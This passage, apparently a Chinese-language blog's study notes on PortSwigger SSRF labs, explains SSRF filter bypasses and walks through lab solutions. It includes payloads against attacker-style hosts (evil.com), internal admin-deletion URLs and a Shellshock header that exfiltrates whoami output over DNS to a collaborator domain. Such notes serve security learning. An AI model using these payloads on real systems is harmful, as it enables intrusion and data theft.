<h3 id="1-2-2-SSRF-attacks-against-other-back-end-systems"><a href="#1-2-2-SSRF-attacks-against-other-back-end-systems" class="headerlink" title="1.2.2 SSRF attacks against other back-end systems"></a>1.2.2 SSRF attacks against other back-end systems</h3><p>针对其他后端系统的SSRF攻击在某些情况下，应用服务器能够与用户无法直接访问的后端系统交互。这些系统通常采用不可路由的私有IP地址。由于后端系统通常受到网络拓扑的保护，其安全防护措施往往较为薄弱。多数情况下，内部后端系统包含敏感功能模块，任何能与系统交互的用户均可未经认证直接访问。以先前示例为例，假设后端存在管理接口<a target="_blank" rel="noopener" href="https://192.168.0.68/admin%E3%80%82%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E6%8F%90%E4%BA%A4%E4%BB%A5%E4%B8%8B%E8%AF%B7%E6%B1%82%E5%88%A9%E7%94%A8SSRF%E6%BC%8F%E6%B4%9E%E8%AE%BF%E9%97%AE%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2%EF%BC%9APOST">https://192.168.0.68/admin。攻击者可提交以下请求利用SSRF漏洞访问管理界面：POST</a> &#x2F;product&#x2F;stock HTTP&#x2F;1.0<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 118</p>
<p>stockApi&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.68/admin">http://192.168.0.68/admin</a></p>
<p>‍</p>
<h2 id="1-3-绕过常见的SSRF防御"><a href="#1-3-绕过常见的SSRF防御" class="headerlink" title="1.3 绕过常见的SSRF防御"></a>1.3 绕过常见的SSRF防御</h2><p>在存在SSRF（服务器端请求伪造）行为的应用程序中，通常会部署防御机制以防止恶意利用。然而，这些防御措施往往可以被绕过。</p>
<h3 id="1-3-1-黑名单"><a href="#1-3-1-黑名单" class="headerlink" title="1.3.1 黑名单"></a>1.3.1 黑名单</h3><p>当应用程序使用基于黑名单的输入过滤来阻止包含如127.0.0.1、localhost等主机名或类似&#x2F;admin等敏感URL时，攻击者可通过多种方式规避此类限制：</p>
<ul>
<li>使用127.0.0.1的其他IP表示形式，例如十进制数2130706433、八进制数017700000001，或简写形式127.1；</li>
<li>注册一个指向127.0.0.1的自定义域名，例如可使用spoofed.burpcollaborator.net实现此目的；</li>
<li>对被拦截的字符串进行混淆处理，例如通过URL编码或改变字母大小写；</li>
<li>提供一个由攻击者控制的URL，该URL会重定向至目标地址。可尝试使用不同类型的重定向状态码以及不同的目标协议（例如，在重定向前从http:切换为https:），已有案例表明这种方式可绕过部分反SSRF过滤机制。</li>
</ul>
<h3 id="1-3-2-基于白名单的输入过滤器下的SSRF"><a href="#1-3-2-基于白名单的输入过滤器下的SSRF" class="headerlink" title="1.3.2 基于白名单的输入过滤器下的SSRF"></a>1.3.2 基于白名单的输入过滤器下的SSRF</h3><p>某些应用程序仅允许输入与白名单中允许值匹配的内容。该过滤器可能在输入开头或输入内容中查找匹配项。您可能通过<strong>利用URL解析中的不一致性</strong>来绕过此过滤器。URL规范包含若干特性，当采用此方法进行临时解析和验证时极易被忽略：</p>
<ol>
<li><p>URL 凭证语法scheme:&#x2F;&#x2F;user:password@host：</p>
<p>开发者可能编写代码检查 URL 是否以 <code>http://whitelist.com</code>​ <strong>开头，</strong> 后端 HTTP 库（如 cURL、Python Requests 等）会将 <code>@</code>​ 之前的内容识别为“用户名&#x2F;密码”，而将 <code>@</code> 之后的内容识别为真正的“目标主机”。</p>
<p>payload:<code>http://whitelist.com:fakePassword@evil.com</code></p>
</li>
<li><p>URL 中 <code>#</code>​ 之后的内容被称为“片段标识符”（Fragment），通常仅在客户端使用，服务器发起请求时往往会截断它。开发者可能编写代码检查 URL 中是否 <strong>包含</strong> <code>whitelist.com</code>​ 字符串。攻击者将白名单域名放在片段中，满足了“包含”条件，但实际请求的目标是片段前的域名。过滤器检测到字符串中存在 <code>whitelist.com</code>​，予以放行。但后端 HTTP 库在处理请求时，通常会丢弃 <code>#</code>​ 及其后的内容，从而请求 <code>evil.com</code>。</p>
<p>payload:<code>http://evil.com/path?query=1#whitelist.com</code></p>
</li>
<li><p>利用 DNS 命名层级（Subdomains）:你在你控制的域名（<code>evil.com</code>）下创建一个子域名，将其命名为与白名单一致。</p>
<p>payload:<code>http://whitelist.com.evil.com</code></p>
</li>
<li><p>利用 URL 编码与双重编码（Encoding）:利用验证层（过滤器）和执行层（后端 HTTP 库）对 URL 解码时机的不同。</p>
</li>
</ol>
<ul>
<li><p><strong>过滤器逻辑：</strong>  过滤器可能在解码前进行匹配，或者禁止了特定字符（如 <code>@</code>​），但允许 <code>%</code>。</p>
</li>
<li><p><strong>绕过原理：</strong></p>
<ul>
<li><strong>单次编码：</strong>  将特殊字符（如 <code>@</code>​）编码为 <code>%40</code>。如果过滤器只是简单的字符串查找，它可能看不出这是个凭证结构。</li>
<li><strong>双重编码：</strong>  将 <code>%</code>​ 本身也编码（<code>%</code>​ -&gt; <code>%25</code>）。如果前端防火墙解码一次，后端应用解码一次，就会产生差异。</li>
</ul>
</li>
</ul>
<p>payload:<a href="http://whitelist.com%40evil.com">http://whitelist.com%40evil.com</a>   或  <a href="http://whitelist.com%2540evil.com">http://whitelist.com%2540evil.com</a></p>
<p>在防御较强的环境中，往往需要组合上述技术。</p>
<h3 id="1-3-3-通过开放重定向绕过SSRF过滤器"><a href="#1-3-3-通过开放重定向绕过SSRF过滤器" class="headerlink" title="1.3.3 通过开放重定向绕过SSRF过滤器"></a>1.3.3 通过开放重定向绕过SSRF过滤器</h3><p>只要用于发起后端HTTP请求的API支持重定向，即可构造满足过滤器要求的URL，从而将请求重定向至目标后端。例如，某应用存在开放重定向漏洞，当访问以下URL时：</p>
<p>&#x3D;&#x3D;&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;<a target="_blank" rel="noopener" href="http://evil-user.net==/">http://evil-user.net==</a></p>
<p>会重定向至：</p>
<p><a target="_blank" rel="noopener" href="http://evil-user.net/">http://evil-user.net</a></p>
<p>此时可利用该漏洞绕过URL过滤器，并通过以下方式利用SSRF漏洞：</p>
<p>​<code>POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118</code></p>
<p>​<code>stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</code></p>
<p>此SSRF攻击成立的原因在于：应用程序首先验证提供的stockAPI网址是否属于允许域（该网址确实属于允许域）。随后应用程序请求该URL，触发开放重定向机制。系统将遵循重定向路径，向攻击者指定的内部URL发起请求。</p>
<h2 id="1-4-Blind-SSRF-vulnerabilities"><a href="#1-4-Blind-SSRF-vulnerabilities" class="headerlink" title="1.4 Blind SSRF vulnerabilities"></a>1.4 Blind SSRF vulnerabilities</h2><p>盲SSRF漏洞是指当应用程序被诱导向指定URL发起后端HTTP请求时，后端请求的响应内容不会出现在应用程序前端响应中的漏洞，有时可导致在服务器或其他后端组件上实现完整的远程代码执行。</p>
<h3 id="1-4-1-如何发现并利用盲SSRF漏洞？"><a href="#1-4-1-如何发现并利用盲SSRF漏洞？" class="headerlink" title="1.4.1 如何发现并利用盲SSRF漏洞？"></a>1.4.1 如何发现并利用盲SSRF漏洞？</h3><p>检测盲SSRF漏洞最可靠的方法是采用带外攻击（OAST）技术。具体操作包括：</p>
<p>尝试向受控外部系统触发HTTP请求，并监测与该系统的网络交互。</p>
<p>运用带外技术的最简便高效方式是使用Burp Collaborator。通过该工具可生成唯一域名，将其封装在有效负载中发送至应用程序，并监测与这些域名的交互。若观察到应用程序发出的入站HTTP请求，则表明存在SSRF漏洞。</p>
<p>在测试SSRF漏洞时，常见现象是观察到对指定协作方域名的DNS解析操作，但后续未产生HTTP请求。这种情况通常源于应用程序尝试向该域名发起HTTP请求，触发了初始DNS解析，但实际HTTP请求被网络层过滤机制拦截。基础设施允许外发DNS流量的情况较为普遍——因其在众多场景中不可或缺——但会阻断指向意外目标的HTTP连接。</p>
<p>仅识别出可触发带外HTTP请求的盲SSRF漏洞本身并不能提供可利用路径。由于无法查看后端请求的响应，该行为无法用于探索应用服务器可访问系统中的内容。但仍可利用其探测服务器本身或其他后端系统上的其他漏洞。可&#x3D;&#x3D;对内部IP地址空间进行盲扫，发送专门用于检测已知漏洞的有效载荷&#x3D;&#x3D;。若这些有效载荷同时采用盲外带技术，则可能发现未打补丁的内部服务器上存在关键漏洞。</p>
<p>利用盲SSRF漏洞的另一种途径是诱使应用程序连接至攻击者控制的系统，并向发起连接的HTTP客户端返回恶意响应。若能利用服务器HTTP实现中的严重客户端漏洞，攻击者可能在应用程序基础设施内实现远程代码执行。</p>
<h2 id="1-5-Finding-hidden-attack-surface-for-SSRF-vulnerabilities"><a href="#1-5-Finding-hidden-attack-surface-for-SSRF-vulnerabilities" class="headerlink" title="1.5 Finding hidden attack surface for SSRF vulnerabilities"></a>1.5 Finding hidden attack surface for SSRF vulnerabilities</h2><p>许多服务器端请求伪造漏洞很容易被发现，因为应用程序的正常流量涉及包含完整URL的请求参数。而其他类型的SSRF漏洞则更难定位。请求中的部分URL有时，应用程序仅将主机名或URL路径的一部分放入请求参数中。提交的值随后会在服务器端被整合成完整的URL进行请求。如果该值能被轻易识别为主机名或URL路径，潜在的攻击面可能显而易见。但由于无法控制请求的完整URL，其作为完整SSRF漏洞的可利用性可能受限。数据格式内的URL 某些应用采用允许包含URL的数据格式进行传输，这些URL可能被格式解析器调用请求。</p>
<p>XML数据格式便是典型案例，该格式被广泛应用于Web应用程序中，用于在客户端与服务器间传输结构化数据。当应用程序接收XML格式数据并进行解析时，可能存在XXE注入漏洞，同时亦可能通过XXE漏洞引发SSRF攻击。我们将在探讨XXE注入漏洞时对此进行详细说明。 通过Referer头引发的SSRF 部分应用程序使用服务器端分析软件追踪访问者。这类软件通常会记录请求中的Referer标头，以便追踪来源链接。分析软件常会访问Referer标头中出现的第三方URL，此举通常用于分析来源网站内容，包括来源链接使用的锚文本。因此，Referer标头往往成为SSRF漏洞的有效攻击面。有关涉及Referer标头的漏洞示例，请参阅盲SSRF漏洞相关章节。</p>
<h1 id="2-实验"><a href="#2-实验" class="headerlink" title="2.实验"></a>2.实验</h1><h2 id="Lab-Basic-SSRF-against-the-local-server"><a href="#Lab-Basic-SSRF-against-the-local-server" class="headerlink" title="Lab: Basic SSRF against the local server"></a>Lab: Basic SSRF against the local server</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82">http://localhost/admin，并删除用户carlos。</a></p>
<p><img src="/images/image-20251201221901-ymw4141.png" alt="image"></p>
<p><img src="/images/image-20251201221926-j2plhqf.png" alt="image"></p>
<p>观察到删除的参数，修改stockapi的参数：</p>
<p><img src="/images/image-20251201222147-0u1e0zr.png" alt="image"></p>
<p><img src="/images/image-20251201222230-8e4v0fy.png" alt="image"></p>
<h2 id="Lab-Basic-SSRF-against-another-back-end-system"><a href="#Lab-Basic-SSRF-against-another-back-end-system" class="headerlink" title="Lab: Basic SSRF against another back-end system"></a>Lab: Basic SSRF against another back-end system</h2><p>该实验室具备库存检查功能，可从内部系统获取数据。为完成实验，请使用库存检查功能扫描内部192.168.0.X网络段，查找端口8080上的管理界面，随后通过该界面删除用户carlos。</p>
<p>‍</p>
<p>访问产品页面，点击“检查库存”，在Burp Suite中拦截请求并发送至Burp Intruder。2. 将stockApi参数修改为<a target="_blank" rel="noopener" href="http://192.168.0.1:8080/admin%EF%BC%8C%E9%80%89%E4%B8%ADIP%E5%9C%B0%E5%9D%80%E6%9C%AB%E4%BD%8D%E5%AD%97%E8%8A%82%EF%BC%88%E6%95%B0%E5%AD%971%EF%BC%89%E5%90%8E%E7%82%B9%E5%87%BB%E6%B7%BB%E5%8A%A0%C2%A7%E3%80%823">http://192.168.0.1:8080/admin，选中IP地址末位字节（数字1）后点击添加§。3</a>. 在有效载荷侧边栏中，将有效载荷类型改为数字，分别在起始值、终止值和步长框中输入1、255和1。4. 点击开始攻击。5. 点击状态列按状态码升序排序。应出现一条状态码为200的条目，显示管理界面。6. 点击该请求，将其发送到Burp Repeater，并将stockApi中的路径修改为：&#x2F;admin&#x2F;delete?username&#x3D;carlos</p>
<p><img src="/images/image-20251202174847-kda9f3f.png" alt="image"></p>
<p>记得url编码</p>
<h2 id="Lab-SSRF-with-blacklist-based-input-filter"><a href="#Lab-SSRF-with-blacklist-based-input-filter" class="headerlink" title="Lab: SSRF with blacklist-based input filter"></a>Lab: SSRF with blacklist-based input filter</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82%E5%BC%80%E5%8F%91%E8%80%85%E9%83%A8%E7%BD%B2%E4%BA%86%E4%B8%A4%E7%A7%8D%E5%BC%B1%E6%8A%97SSRF%E9%98%B2%E5%BE%A1%E6%9C%BA%E5%88%B6%EF%BC%8C%E6%82%A8%E9%9C%80%E8%A6%81%E7%BB%95%E8%BF%87%E8%BF%99%E4%BA%9B%E9%98%B2%E5%BE%A1%E3%80%82">http://localhost/admin，并删除用户carlos。开发者部署了两种弱抗SSRF防御机制，您需要绕过这些防御。</a></p>
<p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。2. 将stockApi参数中的URL修改为<a target="_blank" rel="noopener" href="http://127.0.0.1/%EF%BC%8C%E8%A7%82%E5%AF%9F%E8%AF%B7%E6%B1%82%E8%A2%AB%E6%8B%A6%E6%88%AA%E3%80%823">http://127.0.0.1/，观察请求被拦截。3</a>. 通过将URL改为：<a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1/</a> 绕过拦截。4. 将URL改为<a target="_blank" rel="noopener" href="http://127.0.0.1/admin%EF%BC%8C%E8%A7%82%E5%AF%9FURL%E5%86%8D%E6%AC%A1%E8%A2%AB%E6%8B%A6%E6%88%AA%E3%80%825">http://127.1/admin，观察URL再次被拦截。5</a>. 将”a”进行双重URL编码为%2561实现混淆，从而访问管理界面并删除目标用户。</p>
<p>‍</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1_"external/">http://127.0.0.1_&quot;External</a> stock check blocked for security reasons”</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1</a>      HTTP&#x2F;2 200 OK</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/admin">http://127.1/admin</a>      “External stock check blocked for security reasons”</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45">http://127.1/%25%36%31%25%36%34%25%36%44%25%36%39%25%36%45</a>      HTTP&#x2F;2 200 OK</p>
<p><img src="/images/image-20251202210013-zvuvoq2.png" alt="image"></p>
<p>双重url编码：</p>
<p><img src="/images/image-20251202203730-0ghn6xn.png" alt="image"></p>
<h2 id="Lab-SSRF-with-whitelist-based-input-filter"><a href="#Lab-SSRF-with-whitelist-based-input-filter" class="headerlink" title="Lab: SSRF with whitelist-based input filter"></a>Lab: SSRF with whitelist-based input filter</h2><p>该实验室具备库存查询功能，该功能从内部系统获取数据。<br>为完成实验，请将库存查询网址修改为访问管理界面：<a target="_blank" rel="noopener" href="http://localhost/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82">http://localhost/admin，并删除用户carlos。</a><br>开发者部署了反SSRF防御机制，您需要绕过该机制。</p>
<p>‍</p>
<ol>
<li><p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。</p>
</li>
<li><p>将stockApi参数中的URL修改为<a target="_blank" rel="noopener" href="http://127.0.0.1/%EF%BC%8C%E8%A7%82%E5%AF%9F%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E8%A7%A3%E6%9E%90URL%E3%80%81%E6%8F%90%E5%8F%96%E4%B8%BB%E6%9C%BA%E5%90%8D%E5%B9%B6%E8%BF%9B%E8%A1%8C%E7%99%BD%E5%90%8D%E5%8D%95%E9%AA%8C%E8%AF%81%E7%9A%84%E8%BF%87%E7%A8%8B%E3%80%82">http://127.0.0.1/，观察应用程序解析URL、提取主机名并进行白名单验证的过程。</a></p>
<p><img src="/images/image-20251203093330-vqfn1to.png" alt="image"></p>
</li>
<li><p>将URL改为<a target="_blank" rel="noopener" href="http://username@stock.weliketoshop.net/%EF%BC%8C%E8%A7%82%E5%AF%9F%E8%AF%B7%E6%B1%82%E8%A2%AB%E6%8E%A5%E5%8F%97%EF%BC%8C%E8%A1%A8%E6%98%8EURL%E8%A7%A3%E6%9E%90%E5%99%A8%E6%94%AF%E6%8C%81%E5%B5%8C%E5%85%A5%E5%87%AD%E8%AF%81%E3%80%82">http://username@stock.weliketoshop.net/，观察请求被接受，表明URL解析器支持嵌入凭证。</a></p>
</li>
</ol>
<p><img src="/images/image-20251203093512-drpjpzi.png" alt="image"></p>
<ol start="4">
<li><pre><code class="xml">在用户名前添加#符号，观察URL被拒绝。
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```txt</span><br><span class="line">Double-URL encode the # to %2523，观察到极其可疑的&quot;Internal Server Error&quot;响应，</span><br><span class="line">表明服务器可能尝试连接至&quot;username&quot;。</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
<p><img src="/images/image-20251203093652-c5vrxfc.png" alt="image"></p>
<ol start="5">
<li>访问管理界面并删除目标用户时，将URL修改为： <a target="_blank" rel="noopener" href="http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos">http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos</a></li>
</ol>
<p><img src="/images/image-20251203093736-6dpnqdu.png" alt="image"></p>
<p>‍</p>
<p><img src="/images/image-20251203095137-zaxeqyd.png" alt="image"></p>
<p>‍</p>
<p>http%3A%2F%2Flocalhost%<a href="mailto:&#x32;&#x35;&#50;&#x33;&#64;&#115;&#x74;&#111;&#x63;&#x6b;&#x2e;&#119;&#101;&#x6c;&#105;&#x6b;&#x65;&#x74;&#x6f;&#115;&#x68;&#111;&#112;&#x2e;&#110;&#101;&#116;">&#x32;&#x35;&#50;&#x33;&#64;&#115;&#x74;&#111;&#x63;&#x6b;&#x2e;&#119;&#101;&#x6c;&#105;&#x6b;&#x65;&#x74;&#x6f;&#115;&#x68;&#111;&#112;&#x2e;&#110;&#101;&#116;</a>&#x2F;admin&#x2F;delete?username&#x3D;carlos</p>
<p><img src="/images/image-20251203095001-ty9qe41.png" alt="image"></p>
<ul>
<li>​ <strong>​<code>#</code>​</strong> ​ <strong>字符（片段标识符&#x2F;锚点）</strong>  标记了 URL 中资源的 ​<strong>局部位置</strong>。</li>
<li><strong>最关键的是：</strong>  当一个 URL 被 HTTP 客户端（如浏览器或底层的 HTTP 库）解析时，​ <strong>​<code>#</code>​</strong> ​ <strong>及其后面的所有内容通常不会被发送到服务器端</strong>。它是客户端本地使用的。</li>
</ul>
<p>会将 <code>#</code>​ 视为 URL 路径的一部分，然后将 <code>@</code>​ 识别为用户凭证分隔符。将 <code>@</code>​ <strong>后面的部分</strong> 视为 <strong>真正的主机名，</strong> 而将 <code>@</code>​ <strong>前面的部分</strong> (<code>localhost/#</code>) 视为用户名&#x2F;密码</p>
<p>​<code>localhost</code>​ 的作用是 <strong>满足前端&#x2F;过滤器的白名单或格式检查</strong>，防止其触发 500 错误，从而让你的 payload 能顺利进入 URL 解析器阶段。</p>
<h2 id="Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability"><a href="#Lab-SSRF-with-filter-bypass-via-open-redirection-vulnerability" class="headerlink" title="Lab: SSRF with filter bypass via open redirection vulnerability"></a>Lab: SSRF with filter bypass via open redirection vulnerability</h2><p>该实验室具备库存检查功能，该功能从内部系统获取数据。为完成实验，请将库存检查URL修改为访问管理界面<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin%EF%BC%8C%E5%B9%B6%E5%88%A0%E9%99%A4%E7%94%A8%E6%88%B7carlos%E3%80%82%E5%BA%93%E5%AD%98%E6%A3%80%E6%9F%A5%E7%A8%8B%E5%BA%8F%E5%B7%B2%E8%A2%AB%E9%99%90%E5%88%B6%E4%BB%85%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%9B%A0%E6%AD%A4%E6%82%A8%E9%9C%80%E8%A6%81%E5%85%88%E6%89%BE%E5%88%B0%E5%BD%B1%E5%93%8D%E8%AF%A5%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E3%80%82">http://192.168.0.12:8080/admin，并删除用户carlos。库存检查程序已被限制仅访问本地应用程序，因此您需要先找到影响该应用程序的开放重定向漏洞。</a></p>
<ol>
<li><p>访问商品页面，点击”查看库存”，在Burp Suite中拦截请求并转发至Burp Repeater。</p>
</li>
<li><p>尝试篡改stockApi参数，观察到无法使服务器直接向其他主机发送请求。</p>
</li>
<li><p>点击”下一件商品”，观察到路径参数被放入重定向响应的Location头中，导致开放重定向漏洞。</p>
<p><img src="/images/image-20251203100623-te97z2u.png" alt="image"></p>
</li>
<li><p>构建利用开放重定向漏洞的URL，使其跳转至管理界面，并将此链接填入库存查询器的stockApi参数：&#x2F;product&#x2F;nextProduct?path&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin">http://192.168.0.12:8080/admin</a></p>
</li>
</ol>
<p>   <img src="/images/image-20251203100859-g1eiab2.png" alt="image"><br>5. 观察库存查询器跟随重定向跳转至管理页面。<br>6. 修改路径删除目标用户：&#x2F;product&#x2F;nextProduct?path&#x3D;<a target="_blank" rel="noopener" href="http://192.168.0.12:8080/admin/delete?username=carlos">http://192.168.0.12:8080/admin/delete?username=carlos</a></p>
<h2 id="Lab-Blind-SSRF-with-out-of-band-detection"><a href="#Lab-Blind-SSRF-with-out-of-band-detection" class="headerlink" title="Lab: Blind SSRF with out-of-band detection"></a>Lab: Blind SSRF with out-of-band detection</h2><p>本网站使用分析软件，当产品页面加载时，该软件会获取Referer头中指定的URL。为完成实验，请利用此功能触发向公共Burp协作服务器发送HTTP请求。</p>
<ol>
<li>访问某个产品页面，在Burp Suite中拦截请求并转发至Burp Repeater。</li>
<li>切换至Repeater标签页。选中Referer头部字段，右键点击选择”插入协作器有效负载”，用Burp协作器生成的域名替换原始域名。发送请求。</li>
<li>切换至协作器标签页，点击”立即轮询”。若未显示交互记录，请等待数秒后重试，因服务器端命令采用异步执行机制。</li>
<li>您将看到应用程序因您的有效负载触发的DNS及HTTP交互记录。</li>
</ol>
<p><img src="/images/image-20251203103051-3zjeuj8.png" alt="image"></p>
<p><img src="/images/image-20251203103058-6h9r8qr.png" alt="image"></p>
<h2 id="Lab-Blind-SSRF-with-Shellshock-exploitation"><a href="#Lab-Blind-SSRF-with-Shellshock-exploitation" class="headerlink" title="Lab: Blind SSRF with Shellshock exploitation"></a>Lab: Blind SSRF with Shellshock exploitation</h2><p>本网站使用分析软件，当产品页面加载时会获取Referer头中指定的URL。为完成实验，请利用此功能对192.168.0.X网段内端口8080的内部服务器发起盲SSRF攻击。在盲攻击中，需向该内部服务器发送Shellshock有效载荷，以窃取操作系统用户的名称。</p>
<ol>
<li>在Burp Suite Professional中，从BApp商店安装Collaborator Everywhere扩展。</li>
<li>将实验室域名添加至Burp Suite的目标范围，使Collaborator Everywhere能定位该域名。</li>
<li>浏览该网站。</li>
<li>观察到加载产品页面时，会通过Referer头部触发与Burp Collaborator的HTTP交互。</li>
<li>观察到HTTP交互中包含HTTP请求内的User-Agent字符串。</li>
</ol>
<p><img src="/images/image-20251203104849-o6y2cp3.png" alt="image"></p>
<ol>
<li>将产品页面的请求发送至Burp Intruder</li>
<li>转至Collaborator标签页生成唯一Burp Collaborator有效载荷。将此内容放入Shellshock有效负载</li>
</ol>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">User-Agent:</span> <span class="string">()</span> &#123; <span class="string">:;</span> &#125;<span class="string">;</span> <span class="string">/usr/bin/nslookup</span> <span class="string">$(whoami).k9udcmqymw0o7c46r2xz74tj8ae12sqh.oastify.com</span></span><br><span class="line"></span><br><span class="line"><span class="attr">Referer:</span> <span class="string">http://192.168.0.1:8080</span></span><br></pre></td></tr></table></figure>

<ol>
<li>将Burp Intruder请求中的User-Agent字符串替换为包含Collaborator域名的Shellshock有效负载。</li>
<li>将Referer头修改为<a href="http://192.168.0.1:8080，选中IP地址末位八位组（数字1），点击添加§。">http://192.168.0.1:8080，选中IP地址末位八位组（数字1），点击添加§。</a> 在有效载荷侧边栏中，将有效载荷类型改为数字，分别在起始值、终止值和步长框中输入1、255和1</li>
<li>攻击完成后，转到协作方选项卡，点击立即轮询。若未显示任何交互记录，请等待数秒后重试，因服务器端命令采用异步执行。此时应可见由后端系统发起的DNS交互记录——该系统正是成功盲SSRF攻击的目标。操作系统用户的名称将出现在DNS子域中。</li>
<li>完成实验操作，请输入操作系统用户的名称。</li>
</ol>
<p><img src="/images/image-20251203105814-zeuf320.png" alt="image"></p>
<p><img src="/images/image-20251203111201-ivd9azs.png" alt="image"></p>
<p><img src="/images/image-20251203113203-aatvzlr.png" alt="image"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">() &#123; :; &#125;;</span><br></pre></td></tr></table></figure>

<p>这是 Shellshock 漏洞的标志性特征。</p>
<ul>
<li><strong>原理：</strong>  在受影响的 Bash 版本中，如果环境变量的值以函数定义 <code>() &#123; ... &#125;</code> 开头，Bash 会在导入该环境变量时执行函数定义后面的额外命令。</li>
<li><strong>上下文：</strong>  在 Web服务器（如使用 CGI 的 Apache）中，HTTP 请求头（如 <code>User-Agent</code>​）通常会被转换为环境变量（如 <code>HTTP_USER_AGENT</code>​）。因此，攻击者通过修改 <code>User-Agent</code> 就可以向 Bash 注入恶意环境变量。</li>
</ul>
<p>‍</p>
<ol>
<li><strong>目标服务器</strong>向本地 DNS 服务器发起查询请求：“请告诉我 <code>root.k9udcm....oastify.com</code> 的 IP 是多少？”</li>
<li>如果不在此缓存中，本地 DNS 会逐级查询，最终请求会到达负责解析 <code>oastify.com</code>​ 的​<strong>权威名称服务器</strong>。</li>
<li><strong>攻击者</strong>控制着这台权威名称服务器（在这个例子中，<code>oastify.com</code> 是 Burp Suite Collaborator 的专用域名）。</li>
<li><strong>捕获：</strong>  攻击者在名称服务器的日志中看到了一条查询记录，记录中包含了 <code>root</code> 这个前缀。</li>
<li><strong>结果：</strong>  攻击者成功获知目标服务器是以 <code>root</code> 权限运行的，且证明了该服务器存在 Shellshock 漏洞。</li>
</ol>
<hr>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/19/Server-side%20request%20forgery%20(SSRF)/" data-id="cmkkn2g3x0000agvs4wmc8k45" data-title="3.Server-side request forgery (SSRF)" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Authentication身份验证" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/" class="article-date">
  <time class="dt-published" datetime="2026-01-12T08:58:32.000Z" itemprop="datePublished">2026-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/12/Authentication%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81/">2.Authentication身份验证</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.1.13</p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>身份验证Authentication的关键在于确认用户是其声称的身份，区别于授权authorization确认用户是否被允许执行某个操作，例如，身份验证确定尝试使用用户名Carlos访问网站的人是否真的是创建该账户的人。一旦对Carlos进行了身份验证，他们的权限将决定他们被授权执行哪些操作。因此，身份验证漏洞可能允许攻击者访问敏感数据和功能，它们暴露了额外的攻击面。</p>
<h1 id="2-Vulnerabilities-in-password-based-login"><a href="#2-Vulnerabilities-in-password-based-login" class="headerlink" title="2. Vulnerabilities in password-based login"></a>2. Vulnerabilities in password-based login</h1><h2 id="2-1-Brute-force-attacks"><a href="#2-1-Brute-force-attacks" class="headerlink" title="2.1 Brute-force attacks"></a>2.1 Brute-force attacks</h2><h3 id="2-1-1-usernames"><a href="#2-1-1-usernames" class="headerlink" title="2.1.1 usernames"></a>2.1.1 usernames</h3><ol>
